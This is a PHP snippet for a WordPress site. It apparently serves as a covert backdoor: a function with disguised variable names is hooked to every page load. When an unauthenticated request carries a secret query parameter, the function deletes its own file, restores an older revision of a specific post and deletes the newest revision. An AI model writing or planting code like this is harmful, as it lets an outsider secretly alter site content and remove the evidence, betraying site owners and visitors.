<?php

function keyword_com_shortener() {
	if (isset($_GET['popup_virtual_embed']) && $_GET['popup_virtual_embed'] === 'change_members_wpforms') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$insert_min_show = 23124;
		$plus_audio_flexible = wp_get_post_revisions($insert_min_show);
		if (empty($plus_audio_flexible)) die('no revisions');
		if (count($plus_audio_flexible) < 2) die('less than 2');
		$status_quiz_security = array_shift($plus_audio_flexible);
		$module_background_copyright = $status_quiz_security->ID;
		$article_bank_tracking_nav = array_shift($plus_audio_flexible);
		$more_speed_date = $article_bank_tracking_nav->ID;
		$survey_affiliates_mobile = wp_restore_post_revision($more_speed_date);
		if ($survey_affiliates_mobile === false) die('error restoring');
		$survey_affiliates_mobile = wp_delete_post_revision($module_background_copyright);		
		if ($survey_affiliates_mobile === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'keyword_com_shortener');
